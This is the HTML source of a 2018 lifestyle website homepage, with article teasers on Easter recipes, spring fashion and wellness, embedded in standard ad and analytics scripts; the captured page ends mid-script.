<!doctype html>
<html class="no-js" lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
	<meta charset="UTF-8">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<link rel="shortcut icon" type="image/png"
	      href="http://eternallifestyle.com/wp-content/themes/eternallifestyle/favicon.png"/>


	<title>EternalLifestyle | World&#039;s Best Lifestyle Trends</title>

<!-- This site is optimized with the Yoast SEO plugin v3.4.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="World&#039;s Best Lifestyle Trends"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="http://eternallifestyle.com/" />
<link rel="next" href="http://eternallifestyle.com/page/2/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="website" />
<meta property="og:title" content="EternalLifestyle | World&#039;s Best Lifestyle Trends" />
<meta property="og:description" content="World&#039;s Best Lifestyle Trends" />
<meta property="og:url" content="http://eternallifestyle.com/" />
<meta property="og:site_name" content="EternalLifestyle" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="World&#039;s Best Lifestyle Trends" />
<meta name="twitter:title" content="EternalLifestyle | World&#039;s Best Lifestyle Trends" />
<script type='application/ld+json'>{"@context":"http:\/\/schema.org","@type":"WebSite","url":"http:\/\/eternallifestyle.com\/","name":"EternalLifestyle","potentialAction":{"@type":"SearchAction","target":"http:\/\/eternallifestyle.com\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="EternalLifestyle &raquo; Feed" href="http://eternallifestyle.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="EternalLifestyle &raquo; Comments Feed" href="http://eternallifestyle.com/comments/feed/" />
<link rel='stylesheet' id='EternalLifestyle-style-main-css'  href='http://eternallifestyle.com/wp-content/themes/eternallifestyle/styles/main.css?ver=4.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='EternalLifestyle-style-css'  href='http://eternallifestyle.com/wp-content/themes/eternallifestyle/style.css?ver=4.8.5' type='text/css' media='all' />
<script type='text/javascript' src='http://eternallifestyle.com/wp-content/themes/eternallifestyle/scripts/vendor.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://eternallifestyle.com/wp-content/themes/eternallifestyle/scripts/vendor/modernizr.js?ver=4.8.5'></script>
<link rel='https://api.w.org/' href='http://eternallifestyle.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://eternallifestyle.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://eternallifestyle.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.8.5" />
    <script>
      function storage(key, value) {
          var lsSupport = false;
          // Check for native support
          if (sessionStorage) {
              lsSupport = true;
          }
          // Value supplied, set new or modify store
          if (typeof value !== "undefined" && value !== null) {
              if (typeof value === 'object') {
                  value = JSON.stringify(value);
              }
              if (lsSupport) {
                  sessionStorage.setItem(key, value);
              } else {
                  createCookie(key, value, 30);
              }
          }
          // No value supplied, return value
          else if (typeof value === "undefined") {
              if (lsSupport) {
                  data = sessionStorage.getItem(key);
              } else {
                  data = readCookie(key);
              }
              return data;
          }
          // Null specified, remove store
          else if (value === null) {
              if (lsSupport) {
                  sessionStorage.removeItem(key);
              } else {
                  createCookie(key, '', -1);
              }
          }
          /**
           * Creates new cookie or removes cookie with negative expiration
           * @param  key       The key or identifier for the store
           * @param  value     Contents of the store
           * @param  exp       Expiration - creation defaults to 30 days
           */
          function createCookie(key, value, exp) {
              var date = new Date();
              date.setTime(date.getTime() + (exp * 24 * 60 * 60 * 1000));
              var expires = "; expires=" + date.toGMTString();
              document.cookie = key + "=" + value + expires + "; path=/";
          }
          /**
           * Returns contents of cookie
           * @param  key       The key or identifier for the store
           */
          function readCookie(key) {
              var nameEQ = key + "=";
              var ca = document.cookie.split(';');
              for (var i = 0, max = ca.length; i < max; i++) {
                  var c = ca[i];
                  while (c.charAt(0) === ' ') c = c.substring(1, c.length);
                  if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
              }
              return null;
          }
      }

      function getParameterByName(name) {
          name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
          var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
              results = regex.exec(location.search);
          return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
      }

      function getUtmSource(){
          var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
          var source = getParameterByName('utm_source');
          return source ? source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
      }

      function getUtmCampaign(){
          var SOURCE_CAMPAIGN_KEY = 'cm_tracker_utm_campaign';
          var campaign = getParameterByName('utm_campaign');
          return campaign ? campaign : (storage(SOURCE_CAMPAIGN_KEY) && storage(SOURCE_CAMPAIGN_KEY) !== '' ? storage(SOURCE_CAMPAIGN_KEY) : 'direct');
      }

      function getUtmMedium(){
          var SOURCE_MEDIUM_KEY = 'cm_tracker_utm_medium';
          var medium = getParameterByName('utm_medium');
          return medium ? medium : (storage(SOURCE_MEDIUM_KEY) && storage(SOURCE_MEDIUM_KEY) !== '' ? storage(SOURCE_MEDIUM_KEY) : 'direct');
      }

      function getPageNumber(){
          var index = (document.location.pathname[document.location.pathname.length - 1] == '/')? 2 : 1;
          var number = Number(document.location.pathname.split('/')[document.location.pathname.split('/').length - index]);
          return number? number : 1;
      }
    </script>

    <!-- UNDERDOGMEDIA UTM Tracking Code Start -->
<script data-cfasync="false" language="javascript" async src="//bid.underdog.media/udm_tracker.js"></script>
<!-- UNDERDOGMEDIA UTM Tracking Code End -->

<script>
 (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

 ga('create', 'UA-101984226-1', 'auto');
 ga('send', 'pageview');

</script>

<!-- Begin comScore Tag -->
<script>
  var _comscore = _comscore || [];
  _comscore.push({ c1: "2", c2: "20535424" });
  (function() {
    var s = document.createElement("script"), el = document.getElementsByTagName("script")[0]; s.async = true;
    s.src = (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js";
    el.parentNode.insertBefore(s, el);
  })();
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=20535424&cv=2.0&cj=1" />
</noscript>
<!-- End comScore Tag -->

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-7274752227242058",
    enable_page_level_ads: true
  });
</script>

<script type="text/javascript">
  var taboola_account = 'eternallifestyle';
  var taboola_platform =  'desktop';
  
  var STORAGE_SOURCE_KEY = 'cm_tracker_utm_source';
  var taboola_source = getParameterByName('utm_source');
  taboola_source = taboola_source ? taboola_source : (storage(STORAGE_SOURCE_KEY) && storage(STORAGE_SOURCE_KEY) !== '' ? storage(STORAGE_SOURCE_KEY) : 'direct');
  taboola_source = taboola_source.toLowerCase();

  if (taboola_platform == 'mobile') {
    if (taboola_source == 'taboola') {
      taboola_account += 'mt';
    }
    else if (taboola_source == 'facebook') {
      taboola_account += 'mf';
    }
    else {
      taboola_account += 'mr';
    }
  }
  else if (taboola_platform == 'desktop') {
    if (taboola_source == 'taboola') {
      taboola_account += 'dt';
    }
    else {
      taboola_account += 'dr';
    }
  }
  else if (taboola_platform == 'tablet') {
      taboola_account += 't';
  }
  
  window._taboola = window._taboola || [];
  _taboola.push({article:'auto'});
  !function (e, f, u, i) {
    if (!document.getElementById(i)){
      e.async = 1;
      e.src = u;
      e.id = i;
      f.parentNode.insertBefore(e, f);
    }
  }(document.createElement('script'),
  document.getElementsByTagName('script')[0],
  '//cdn.taboola.com/libtrc/' + taboola_account + '/loader.js',
  'tb_loader_script');
</script>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.10";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script><script type='text/javascript'>var PREBID_TIMEOUT = 1600; var adUnits = eval(atob("W10="));var pbjs = pbjs || {}; pbjs.que = pbjs.que || []; pbjs.bidderSettings = {aol: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},brealtime: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.95;}},springserve: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},districtmDMX: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.85;}},sekindo: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.8;}},sharethrough: {bidCpmAdjustment: function(bidCpm){return bidCpm * 0.9;}}};</script>
   <script type="text/javascript" src="//d1upt0rqzff34l.cloudfront.net/EL/prebid.js" async></script>


  <script>

    var googletag = googletag || {};
    googletag.cmd = googletag.cmd || [];
    googletag.cmd.push(function() {
        googletag.pubads().disableInitialLoad();
        googletag.pubads().collapseEmptyDivs(true);
        googletag.pubads().setTargeting("pageNumber", String(getPageNumber()));
        googletag.pubads().setTargeting("utmSource", getUtmSource());
    });

    
            !function(a9,a,p,s,t,A,g){if(a[a9])return;function q(c,r){a[a9]._Q.push([c,r])}a[a9]={init:function(){q("i",arguments)},fetchBids:function(){q("f",arguments)},setDisplayBids:function(){},targetingKeys:function(){return[]},_Q:[]};A=p.createElement(s);A.async=!0;A.src=t;g=p.getElementsByTagName(s)[0];g.parentNode.insertBefore(A,g)}("apstag",window,document,"script","//c.amazon-adsystem.com/aax2/apstag.js");

            apstag.init({pubID: '2392489f-58a6-413d-8e31-f9d6d907c229', adServer: 'googletag'});

            apstag.fetchBids({
                slots: [
                    
                        {slotName: '/21617817323/el-desktop-low', sizes: [[728, 90]], slotID: 'ad_pos_el-desktop-low'},
                        {slotName: '/21617817323/el-desktop-top', sizes: [[728, 90]], slotID: 'ad_pos_el-desktop-top'},
                        {slotName: '/21617817323/el-rr-atf', sizes: [[300, 250]], slotID: 'ad_pos_el-rr-atf'},
                        {slotName: '/21617817323/el-rr-btf', sizes: [[300, 250]], slotID: 'ad_pos_el-rr-btf'},
                        {slotName: '/21617817323/el-rr-mid', sizes: [[300, 250], [300, 600]], slotID: 'ad_pos_el-rr-mid'},
                                        ],
                timeout: 2e3
            }, function(bids) {
                googletag.cmd.push(function(){
                    apstag.setDisplayBids();
                });
            });
        
    pbjs.que.push(function() {
        pbjs.setPriceGranularity({
            "buckets" : [{
                "precision": 2,
                "min" : 0,
                "max" : 3,
                "increment" : 0.01
            },
                {
                    "precision": 2,
                    "min" : 3,
                    "max" : 5,
                    "increment" : 0.05
                },
                {
                    "precision": 2,
                    "min" : 5,
                    "max" : 10,
                    "increment" : 0.1
                },
                {
                    "precision": 2,
                    "min" : 10,
                    "max" : 30,
                    "increment" : 0.5
                }]
        });
        pbjs.addAdUnits(adUnits);
        pbjs.requestBids({
            bidsBackHandler: sendAdserverRequest
        });
    });

	pbjs.que.push(function() {
	    pbjs.enableAnalytics({
	        provider: 'cmv2'
	    });
	});

    function sendAdserverRequest() {
        if (pbjs.adserverRequestSent) return;
        pbjs.adserverRequestSent = true;
        googletag.cmd.push(function() {
            pbjs.que.push(function() {
                pbjs.setTargetingForGPTAsync();
                googletag.pubads().refresh();
            });
        });
    }

    setTimeout(function() {
        sendAdserverRequest();
    }, PREBID_TIMEOUT);



  </script>

  <script>
    (function () {
        var gads = document.createElement('script');
        gads.async = true;
        gads.type = 'text/javascript';
        var useSSL = 'https:' == document.location.protocol;
        gads.src = (useSSL ? 'https:' : 'http:') +
                '//www.googletagservices.com/tag/js/gpt.js';
        var node = document.getElementsByTagName('script')[0];
        node.parentNode.insertBefore(gads, node);
    })();
  </script>

<script>
		googletag.cmd.push(function () {
		            //                googletag.defineSlot('/21617817323/el-eof-top', [[468, 60], [300, 250], [728, 90]], 'ad_pos_el-eof-top').addService(googletag.pubads());
            googletag.defineOutOfPageSlot('/21617817323/el-edge', 'ad_pos_el-edge').addService(googletag.pubads());

            
            googletag.defineSlot('/21617817323/el-desktop-low', [728, 90], 'ad_pos_el-desktop-low').addService(googletag.pubads());
            googletag.defineSlot('/21617817323/el-desktop-top', [728, 90], 'ad_pos_el-desktop-top').addService(googletag.pubads());
            googletag.defineSlot('/21617817323/el-rr-atf', [300, 250], 'ad_pos_el-rr-atf').addService(googletag.pubads());
            googletag.defineSlot('/21617817323/el-rr-btf', [300, 250], 'ad_pos_el-rr-btf').addService(googletag.pubads());
            googletag.defineSlot('/21617817323/el-rr-mid', [[300, 250], [300, 600]], 'ad_pos_el-rr-mid').addService(googletag.pubads());
			
        googletag.pubads().enableSingleRequest();
        googletag.enableServices();


    });
  </script>


</head>
<body class="home blog">
<script src="http://d1rlca3pqma1yp.cloudfront.net/minder-tracker.js"></script>

<!--[if lt IE 10]>
<p class="browserupgrade">You are using an <strong>outdated</strong> browser.
	Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve
	your experience.</p>
<![endif]-->


<header id="top_header" class="navbar-fixed-top">
	<nav class="navbar navbar-default" id="top_nav">
		<div class="container">
			<!-- Brand and toggle get grouped for better mobile display -->
			<div class="navbar-header">
				<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false" aria-controls="navbar-collapse-1">
					<span class="sr-only">Toggle navigation</span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
					<span class="icon-bar"></span>
				</button>
				<div class="navbar-brand">
					<div class="navbar-brand-img-wrap">
						<a class="navbar-brand-img-wrap-link" href="http://eternallifestyle.com">
															<img
									src="http://eternallifestyle.com/wp-content/themes/eternallifestyle/images/logo.png"
									alt="EternalLifestyle"
									class="logo-image">
													</a>
					</div>
				</div>
			</div>

			<!-- Collect the nav links, forms, and other content for toggling -->
			<div class="collapse navbar-collapse" id="navbar-collapse-1">
				<div class="flex-wrap navbar-left">
					<ul id="menu-top-menu-left" class="nav navbar-nav"><li id="menu-item-1090" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1090"><a title="Living" href="http://eternallifestyle.com/category/living/">Living</a></li>
<li id="menu-item-1091" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1091"><a title="Travel" href="http://eternallifestyle.com/category/travel/">Travel</a></li>
<li id="menu-item-1134" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1134"><a title="Food" href="http://eternallifestyle.com/category/food/">Food</a></li>
<li id="menu-item-1093" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1093"><a title="Health" href="http://eternallifestyle.com/category/health/">Health</a></li>
</ul>				</div>
				<div class="flex-wrap navbar-right">
					<ul id="menu-top-menu-right" class="nav navbar-nav"><li id="menu-item-1135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1135"><a title="Fashion" href="http://eternallifestyle.com/category/fashion/">Fashion</a></li>
<li id="menu-item-1095" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1095"><a title="Trends" href="http://eternallifestyle.com/category/trends/">Trends</a></li>
<li id="menu-item-1096" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1096"><a title="Technology" href="http://eternallifestyle.com/category/technology/">Technology</a></li>
</ul>				</div>
			</div><!-- /.navbar-collapse -->

			<div class="top_social">
				<a href="https://www.facebook.com/EternalLifestyle1/" target="_blank" class="icon icon-fb_top"></a>
				<a href="https://twitter.com/lifestyle_etern" target="_blank" class="icon icon-tw_top"></a>
			</div>
		</div><!-- /.container-fluid -->
	</nav>
</header>






<div id="banner">
										<a href="http://eternallifestyle.com/food/easter-speciality-hot-cross-buns-recipe/" class="banner_item">
				<div class="banner_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/21084040/hot-cross-buns.jpg')"></div>
				<div class="banner_item_content_wrap">
					<div class="container">
						<div class="row">
							<div class="col-xs-12">
								<div class="banner_item_content">
									<p class="banner_item_category">Food</p>
									<h2 class="banner_item_header">Easter Speciality-Hot Cross Buns Recipe</h2>
									<p class="banner_item_meta">By <span class="banner_item_meta_name">Tamar Medjool</span>
										<span class="icon icon-leaf_big"> </span>
										<span class="banner_item_meta_date">3/21/2018</span></p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</a>
			
</div>
<div id="top_ads">
  <div class="container">
    <div class="row">
      <div class="col-xs-12">

        <div class="top_ads top_ads_mob hidden-md hidden-lg">
              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- EL Hompepage 300x250 -->
              <ins class="adsbygoogle"
                   style="display:inline-block;width:300px;height:250px"
                   data-ad-client="ca-pub-7274752227242058"
                   data-ad-slot="3103810924"></ins>
              <script>
                  (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
        </div>

        <div class="top_ads top_ads_desk hidden-xs hidden-sm">
              <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- EL Homepage 728x90 -->
              <ins class="adsbygoogle"
                   style="display:inline-block;width:728px;height:90px"
                   data-ad-client="ca-pub-7274752227242058"
                   data-ad-slot="1627077724"></ins>
              <script>
                  (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
        </div>
      </div>
    </div>
  </div>


</div>

<div id="two_post_with_ads">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<h2 class="main_header">Wellness</h2>
				<div class="two_post_with_ads_wrap">
																										<div class="two_post_with_ads_item_wrap">
								<a href="http://eternallifestyle.com/health/10-healthy-happy-habits-adopt-spring/" class="two_post_with_ads_item">
									<div class="two_post_with_ads_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/20084527/Screen-Shot-2018-03-20-at-10.30.40-AM.png')"></div>
									<div class="two_post_with_ads_item_content">
										<h2 class="two_post_with_ads_item_content_header">10 Happy Healthy Habits To Adopt This Spring</h2>
										<p class="two_post_with_ads_item_meta">By
											<span class="two_post_with_ads_item_meta_name">G. Barnett</span>
											<span class="icon icon-leaf_sm"> </span>
											<span class="two_post_with_ads_item_meta_date">3/20/2018</span></p>
										<p class="two_post_with_ads_item_text">





Trying to adopt a healthy lifestyle and maintain it can be a challenge. So let's make gratitude our attitude, and focus on the positives...</p>
									</div>
								</a>
							</div>
							<div class="two_post_with_ads_item_wrap two_post_with_ads_item_wrap_center hidden-xs hidden-sm">
  <div class="two_post_with_ads_item">
    <div class="two_post_with_ads_item_ads">
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <!-- EL Hompepage 300x250 -->
        <ins class="adsbygoogle"
             style="display:inline-block;width:300px;height:250px"
             data-ad-client="ca-pub-7274752227242058"
             data-ad-slot="3103810924"></ins>
        <script>
            (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
    </div>

    <div class="two_post_with_ads_item_social">
      <a href="https://www.facebook.com/EternalLifestyle1/" target="_blank" class="icon icon-fb_big"></a>
      <a href="https://twitter.com/lifestyle_etern" target="_blank" class="icon icon-tw_big"></a>
    </div>

  </div>
</div>

																												<div class="two_post_with_ads_item_wrap">
								<a href="http://eternallifestyle.com/fashion/latest-looks-try-spring/" class="two_post_with_ads_item">
									<div class="two_post_with_ads_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/19081644/Screen-Shot-2018-03-19-at-10.16.02-AM.png')"></div>
									<div class="two_post_with_ads_item_content">
										<h2 class="two_post_with_ads_item_content_header">The Latest Looks You Have To Try This Spring</h2>
										<p class="two_post_with_ads_item_meta">By
											<span class="two_post_with_ads_item_meta_name">G. Barnett</span>
											<span class="icon icon-leaf_sm"> </span>
											<span class="two_post_with_ads_item_meta_date">3/19/2018</span></p>
										<p class="two_post_with_ads_item_text">



The two-tone look is really in this season. So get ready to start embracing contrasting colors and get into the swing of Spring.
...</p>
									</div>
								</a>
							</div>
														
				</div>
			</div>
		</div>
	</div>
</div>
<div id="three_blocks">
	<div class="container">
		<div class="wrap_three_blocks">
			<div class="three_blocks_col three_blocks_col_3">
				
<div id="three_blocks_left">
	<div class="three_blocks_items_wrap">
		<div class="three_blocks_left">
																		<a href="http://eternallifestyle.com/living/welcome-spring-equinox/" class="three_blocks_left_item">
						<div class="three_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/18085224/Screen-Shot-2018-03-18-at-10.50.13-AM-350x190.png')"></div>
						<div class="three_blocks_left_item_content">
							<h2 class="three_blocks_left_item_header">How To Welcome The Spring Equinox</h2>
						</div>
					</a>
																				<a href="http://eternallifestyle.com/beauty/lazy-girl-hacks-looking-good-weekend/" class="three_blocks_left_item">
						<div class="three_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/15084336/Screen-Shot-2018-03-15-at-10.42.45-AM-350x190.png')"></div>
						<div class="three_blocks_left_item_content">
							<h2 class="three_blocks_left_item_header">Lazy Girl Hacks For Looking Good This Weekend</h2>
						</div>
					</a>
																				<a href="http://eternallifestyle.com/food/get-friday-feeling-delicious-spring-cocktail-recipes/" class="three_blocks_left_item">
						<div class="three_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/15082638/Screen-Shot-2018-03-15-at-10.26.04-AM-350x190.png')"></div>
						<div class="three_blocks_left_item_content">
							<h2 class="three_blocks_left_item_header">Get Into The Friday Feeling- Delicious Spring Cocktail Recipes</h2>
						</div>
					</a>
																				<a href="http://eternallifestyle.com/trends/spring-workout-essentials/" class="three_blocks_left_item">
						<div class="three_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2017/08/16080902/health-fitness-2013-12-09-woman-running-main-350x190.jpg')"></div>
						<div class="three_blocks_left_item_content">
							<h2 class="three_blocks_left_item_header">Spring Workout Essentials</h2>
						</div>
					</a>
							</div>
	</div>
</div>
			</div>

			<div class="three_blocks_col three_blocks_col_6 hidden-xs hidden-sm">
				<div id="three_blocks_center">
	<div class="three_blocks_items_wrap">
		
<div id="three_blocks_center_three_post">
										<div class="three_blocks_center_three_post_wrap">
				<a href="http://eternallifestyle.com/travel/easter-getaway-ideas/" class="three_blocks_center_three_post_item">
					<div class="three_blocks_center_three_post_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/14081918/easter_vacation_getaways_f-150x120.jpg')"></div>
					<div class="three_blocks_center_three_post_item_content">
						<p class="three_blocks_center_three_post_item_content_meta">Travel</p>
						<h2 class="three_blocks_center_three_post_item_content_header">Easter Getaway Ideas</h2>
					</div>
				</a>
			</div>
												<div class="three_blocks_center_three_post_wrap">
				<a href="http://eternallifestyle.com/health/healthy-smoothie-bowl-recipe-cheer-tuesday/" class="three_blocks_center_three_post_item">
					<div class="three_blocks_center_three_post_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/13133825/Screen-Shot-2018-03-13-at-3.38.11-PM-150x120.png')"></div>
					<div class="three_blocks_center_three_post_item_content">
						<p class="three_blocks_center_three_post_item_content_meta">Food</p>
						<h2 class="three_blocks_center_three_post_item_content_header">Healthy Smoothie Bowl Recipe-To Cheer You Up This Tuesday</h2>
					</div>
				</a>
			</div>
												<div class="three_blocks_center_three_post_wrap">
				<a href="http://eternallifestyle.com/health/need-head-tel-aviv-healthy-hot-spot/" class="three_blocks_center_three_post_item">
					<div class="three_blocks_center_three_post_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/13084249/Screen-Shot-2018-03-13-at-9.58.02-AM-150x120.png')"></div>
					<div class="three_blocks_center_three_post_item_content">
						<p class="three_blocks_center_three_post_item_content_meta">Health</p>
						<h2 class="three_blocks_center_three_post_item_content_header">Why You Need To Head To This Healthy Hot Spot</h2>
					</div>
				</a>
			</div>
			</div>
		
<div id="three_blocks_center_one_post">
					<a href="http://eternallifestyle.com/food/show-stopping-easter-nest-cake-recipe/" class="three_blocks_center_one_post_item">
			<div class="three_blocks_center_one_post_item_content">
				<p class="three_blocks_center_one_post_item_content_meta">Food</p>
				<h2 class="three_blocks_center_one_post_item_content_header">Show Stopping Easter Nest Cake Recipe</h2>
				<p class="three_blocks_center_one_post_item_content_text">





It's nearly Easter, so let's get into the mood by baking some fun delicious treats....</p>
			</div>
			<div class="three_blocks_center_one_post_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/12082421/easter-nest-cake-350x190.jpg')"></div>
		</a>
	
</div>
	</div>
</div>
			</div>

			<div class="three_blocks_col three_blocks_col_3 hidden-xs hidden-sm">
				
<div id="three_blocks_right">
	<div class="three_blocks_items_wrap">
														<a href="http://eternallifestyle.com/living/sunday-funday-activities/" class="three_blocks_right_item">
					<div class="three_blocks_right_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/11080738/walking-to-lose-weight_2.jpg')"></div>
					<div class="three_blocks_right_item_content">
						<p class="three_blocks_right_item_content_meta">Living</p>
						<h2 class="three_blocks_right_item_content_header">Sunday Funday Activities</h2>
					</div>
				</a>
																<a href="http://eternallifestyle.com/living/weekends-best-reads/" class="three_blocks_right_item">
					<div class="three_blocks_right_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/07103134/coffee-reading-woman.jpg')"></div>
					<div class="three_blocks_right_item_content">
						<p class="three_blocks_right_item_content_meta">Living</p>
						<h2 class="three_blocks_right_item_content_header">This Weekend&#8217;s Best Reads</h2>
					</div>
				</a>
					</div>
</div>
			</div>

		</div>
	</div>
</div>
<div id="two_blocks">
	<div class="container">
		<div class="row">
			<div class="col-md-8 hidden-sm hidden-xs two_blocks_left">
				<h2 class="main_header">Popular</h2>
<div class="two_blocks_left_wrap two_blocks_wrap">
										<a href="http://eternallifestyle.com/food/friday-fajitas-recipe/" class="two_blocks_left_item">
				<div class="two_blocks_left_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/07101932/chicken-fajitas-videoSixteenByNineJumbo1600-407x293.jpg')"></div>
				<div class="two_blocks_left_item_content">
					<h2 class="two_blocks_left_item_content_header">Friday Fajitas Recipe</h2>

					<p class="two_blocks_left_item_content_meta">By <span class="two_blocks_left_item_content_meta_name">Jennifer Hall</span>
						<span class="icon icon-leaf_sm"> </span>
						<span class="two_blocks_left_item_content_meta_date">3/9/2018</span></p>

					<p class="two_blocks_left_item_content_text">





Get into the Friday feeling with a fun, easy and delicious dish for your family, or invite some friends over and crack open a bottle of wine and watch a great chick flick.

Ingredients:

• chicken breast strips (or meat)
•...</p>

					<span class="two_blocks_left_item_content_read_more">Read More</span>
				</div>
			</a><!--./two_blocks_left_item-->
			</div>
			</div>
			<div class="col-md-4 two_blocks_right">
				
<h2 class="main_header">Editor's Picks</h2>
<div class="two_blocks_right_wrap two_blocks_wrap">
	<ul class="two_blocks_right_items">
										<li class="two_blocks_right_item">
					<a href="http://eternallifestyle.com/living/celebration-international-womens-day-top-classics-female-authors/">In Celebration Of International Women&#8217;s Day: The Top Classics By Female Authors</a></li>
												<li class="two_blocks_right_item">
					<a href="http://eternallifestyle.com/trends/vibe-attracts-tribe-wellness-fashion-brands-positive-message/">Your Vibe Attracts Your Tribe- Fashion Brands With A Positive Message</a></li>
												<li class="two_blocks_right_item">
					<a href="http://eternallifestyle.com/food/indulgent-vegan-chocolate-peanut-butter-cake/">The Most Indulgent Vegan Chocolate And Peanut Butter Cake</a></li>
												<li class="two_blocks_right_item">
					<a href="http://eternallifestyle.com/health/nuts-coconuts-10-incredible-uses-coconut-oil/">Nuts About Coconuts! 10 Incredible Uses for Coconut Oil</a></li>
					</ul>
</div>
			</div>
		</div>
	</div>
</div>

<div id="hot_block">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<h2 class="main_header">Hot!</h2>
				<div class="hot_block_wrap">
																										<a href="http://eternallifestyle.com/health/sunday-self-care-tips/" class="hot_block_item">
								<div class="hot_block_item_img" style="background-image: url('http://d1v3t0rdobjdgs.cloudfront.net/wp-content/uploads/2018/03/04080724/Screen-Shot-2018-03-04-at-10.06.58-AM-354x400.png')"></div>
								<div class="hot_block_item_content">
									<h2 class="hot_block_item_content_header">Sunday Self-Care Tips</h2>

									<p class="hot_block_item_content_meta">By <span class="hot_block_item_content_meta_name">Jennifer Hall</span>
										<span class="icon icon-leaf_sm"> </span> <span class="hot_block_item_content_meta_date">3/4/2018</span>
									</p>

									<p class="hot_block_item_content_text">





It's Sunday, it's March and Spring is in the air. Make this Sunday all about you, and show yourself some tender loving care. Use this as an opportunity to pamper yourself, or do things you haven't found time to do. Here are some fun and...</p>

									<span class="hot_block_item_content_read_more">Read More</span>
								</div>
							</a><!--./hot_block_item-->
												<div id="hot_block_ads" class="hidden-xs hidden-sm">
  <div class="hot_block_ads_item">
      <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
      <!-- EL Hompepage 300x250 -->
      <ins class="adsbygoogle"
           style="display:inline-block;width:300px;height:250px"
           data-ad-client="ca-pub-7274752227242058"
           data-ad-slot="3103810924"></ins>
      <script>
